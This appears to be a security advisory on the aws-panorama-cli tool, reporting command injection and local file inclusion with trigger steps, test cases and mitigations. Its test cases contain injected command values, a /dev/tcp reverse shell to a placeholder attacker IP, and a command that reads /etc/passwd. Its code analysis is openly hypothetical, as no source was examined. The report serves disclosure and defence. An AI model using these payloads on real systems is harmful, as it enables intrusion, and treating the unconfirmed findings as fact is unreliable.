## Vulnerability Report

### 1. Command Injection

* Vulnerability Name: Command Injection
* Description:
    The `aws-panorama-cli` tool is vulnerable to command injection. This occurs because the tool uses user-provided input, such as project names, package names, asset names, or file paths, without proper sanitization when constructing shell commands. This can happen in various commands, including `panorama-cli init-project`, `panorama-cli create-package`, `panorama-cli add-raw-model`, and `panorama-cli build-container`.

    Specifically, when a user executes commands like `panorama-cli init-project --name <project_name>`, the value provided for `--name` is incorporated into shell commands. An attacker can craft malicious input containing shell metacharacters or commands. When processed by the CLI without proper sanitization, these metacharacters are interpreted by the shell, allowing the attacker to execute arbitrary commands on the system running the `panorama-cli` tool with the privileges of the user running the tool.

    **Steps to trigger the vulnerability:**

    1. **Project Initialization:**
        a. Execute the command `panorama-cli init-project --name "test_project; touch injected_init_project.txt"` in a terminal.
        b. Observe the current directory for the creation of a file named `injected_init_project.txt`.

    2. **Package Creation:**
        a. Navigate into an existing project directory created by `panorama-cli init-project`.
        b. Execute the command `panorama-cli create-package --name "malicious_package; touch injected_package.txt"` in a terminal.
        c. Observe the project directory for the creation of a file named `injected_package.txt`.

    In both cases, if the `injected_.txt` file is created, it indicates successful command injection.

* Impact:
    Successful command injection allows an attacker to execute arbitrary commands on the developer's local machine. This can lead to severe consequences:
    * **Unauthorized access to sensitive data:** Stealing sensitive files and information from the developer's machine or cloud.
    * **Malware installation:** Installing malware or backdoors for persistent access and system compromise.
    * **System compromise:** Gaining full control over the developer's machine, potentially leading to lateral movement within a network.
    * **Code manipulation:** Modifying project files or injecting malicious code into the application being developed, leading to supply chain attacks.
    * **Privilege escalation:** If the CLI tool is run with elevated privileges, the attacker might be able to escalate their privileges on the system.

* Vulnerability Rank: Critical

* Currently Implemented Mitigations:
    Based on the provided documentation (README.md, CONTRIBUTING.md, Dockerfile, setup.py, code of conduct, install script), there are no explicit mitigations implemented to prevent command injection vulnerabilities. The documentation focuses on tool usage and setup, not security best practices within the CLI tool's code.

* Missing Mitigations:
    * **Input Sanitization:** Implement robust input sanitization for all user-provided arguments (project names, package names, asset names, file paths) that are used in shell commands. This should include escaping shell metacharacters or using parameterized commands to prevent injection. Use allow lists for characters where possible instead of deny lists.
    * **Use of Safe APIs:**  Instead of directly executing shell commands with user-provided input, the code should use safer APIs for file system operations, such as Python's `os` and `shutil` modules, ensuring that project names are treated as data and not as commands. For example, using `os.makedirs(os.path.join("projects", project_name), exist_ok=True)` instead of shell commands.
    * **Parameterized Commands:** Utilize parameterized commands or functions provided by libraries like `subprocess` to avoid direct shell command construction. This ensures that user inputs are treated as data rather than executable code.
    * **Principle of Least Privilege:** Ensure that the `panorama-cli` tool, and any subprocesses it spawns, operate with the minimum necessary privileges. This can limit the impact of a successful command injection.
    * **Security Audits and Code Reviews:** Regularly conduct security audits and code reviews, specifically focusing on areas where user input is processed and shell commands are constructed.

* Preconditions:
    * The attacker must have the ability to execute `panorama-cli` commands on a system where the tool is installed.
    * For specific exploitation scenarios, the attacker might need to socially engineer a developer to use a malicious project name or package name, or to process a malicious file path.
    * The `panorama-cli` tool must be vulnerable to command injection due to insufficient input sanitization in the code that constructs and executes shell commands.

* Source Code Analysis:
    Due to the lack of provided source code, a precise analysis is not possible. However, based on typical CLI tool implementations, the vulnerability likely arises from constructing shell commands by directly embedding user inputs without proper escaping or sanitization. Hypothetical vulnerable code examples include:

    ```python
    import subprocess
    import os

    # Example 1: Vulnerable project initialization
    def init_project(project_name):
        command = f"mkdir projects/{project_name}" # Vulnerable string formatting
        subprocess.run(command, shell=True, check=True)

    # Example 2: Vulnerable package creation
    def create_package(package_name, project_path):
        package_path_command = f"mkdir {project_path}/packages/{package_name}" # Highly vulnerable command construction
        subprocess.run(package_path_command, shell=True, check=True)
    ```

    In these examples, if `project_name` or `package_name` contain shell metacharacters, they will be executed as commands.

* Security Test Case:

    1. **Setup:** Install `panorama-cli` on a test system.
    2. **Test Case 1: Project Initialization Command Injection:**
        a. Execute: `panorama-cli init-project --name "vuln_project\`touch injected_init_project.txt\`"`
        b. Verify if `injected_init_project.txt` is created in the current directory.

    3. **Test Case 2: Package Creation Command Injection:**
        a. Navigate to a Panorama project directory.
        b. Execute: `panorama-cli create-package --name "vuln_package\`touch injected_create_package.txt\`"`
        c. Verify if `injected_create_package.txt` is created within the project directory.

    4. **Test Case 3: General Command Injection (using touch):**
        a. Execute: `panorama-cli init-project --name "test_project; touch /tmp/pwned"`
        b. Verify if `/tmp/pwned` is created.

    5. **Test Case 4: More impactful Command Injection (reverse shell - use with caution and in a controlled environment):**
        a. Prepare a listener on your attacker machine: `nc -lvp 4444`
        b. Execute: `panorama-cli init-project --name "test_project; bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"` (Replace `<attacker_ip>` with your attacker machine IP).
        c. Check if a reverse shell connection is established on your attacker machine.

    If any of the `injected_.txt` files are created, or a reverse shell is established, it confirms the command injection vulnerability.

### 2. Local File Inclusion in `add-raw-model` command

* Vulnerability Name: Local File Inclusion in `add-raw-model` command
* Description:
    The `add-raw-model` command in `aws-panorama-cli` is vulnerable to local file inclusion (LFI). This vulnerability can be exploited via the `--model-local-path` option. If the `panorama-cli` tool does not properly sanitize the file path provided to `--model-local-path`, an attacker can read arbitrary files from the developer's local filesystem. The tool might process or include the file specified by the attacker without sufficient validation, potentially revealing sensitive information.

    **Steps to trigger the vulnerability:**
    1. Initialize a new Panorama project using `panorama-cli init-project`.
    2. Create a dummy descriptor file (`test_descriptor.json`).
    3. Execute the `add-raw-model` command, providing a path to a sensitive system file (e.g., `/etc/passwd` on Linux or `/etc/hosts` on macOS) as the `--model-local-path`:
       ```shell
       panorama-cli add-raw-model --model-asset-name sensitive_file_content --model-local-path /etc/passwd --descriptor-path test_descriptor.json --packages-path packages/accountXYZ-call_node-1.0
       ```

* Impact:
    Successful exploitation of the LFI vulnerability allows an attacker to:
    * **Read sensitive files:** Access configuration files, private keys, source code, and any other file accessible to the user running `panorama-cli`.
    * **Information Disclosure:** This information can be used for further attacks, such as gaining unauthorized access to AWS accounts, internal systems, or compromising intellectual property.
    * **Compromise Developer Environment:** Exposing sensitive data from the developer's machine can lead to broader security compromises.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    No mitigations are mentioned in the provided documentation for local file inclusion vulnerabilities in the `add-raw-model` command and specifically for the `--model-local-path` option.

* Missing Mitigations:
    * **Input Sanitization and Path Validation:** Implement strict path validation for the `--model-local-path` option. Ensure that the provided path is restricted to intended directories, such as the project's asset directory or a designated safe location for model files.
    * **Path Traversal Prevention:** Sanitize the input path to prevent path traversal attacks by blocking characters like `..` and ensuring that the path is treated as a filename within the allowed directory and not as an arbitrary system path.
    * **Secure File Handling Practices:** Employ secure file handling practices to avoid directly using user-provided paths in file operations without validation.

* Preconditions:
    * The attacker needs to convince a developer to use the `aws-panorama-cli` tool.
    * The developer must execute the `add-raw-model` command with the `--model-local-path` option.
    * The attacker needs to know or guess the file path on the developer's local filesystem that they want to access.

* Source Code Analysis:
    Without access to the source code, analysis is based on assumptions. A hypothetical vulnerable scenario involves directly using the `--model-local-path` value in file operations without validation.

    ```python
    import os
    import shutil

    def add_raw_model(model_local_path, model_asset_path):
        # Vulnerable code - directly using user provided path
        shutil.copy2(model_local_path, model_asset_path)
    ```
    In this hypothetical code, `model_local_path` is directly used in `shutil.copy2` without any validation, allowing LFI.

* Security Test Case:
    1. **Setup:** Initialize a Panorama project and create a dummy descriptor file.
    2. **Execute LFI Test:**
       ```shell
       panorama-cli add-raw-model --model-asset-name sensitive_file_content --model-local-path /etc/passwd --descriptor-path test_descriptor.json --packages-path packages/accountXYZ-call_node-1.0
       ```
    3. **Examine Asset File:** Check the project's asset directory for a file related to `sensitive_file_content`. Inspect its content.
    4. **Verification:** If the asset file contains the content of `/etc/passwd`, it confirms the LFI vulnerability.

This report highlights two critical vulnerabilities: Command Injection and Local File Inclusion, both posing significant security risks to developers using `aws-panorama-cli`. Immediate remediation is recommended, focusing on input sanitization, secure coding practices, and thorough security testing.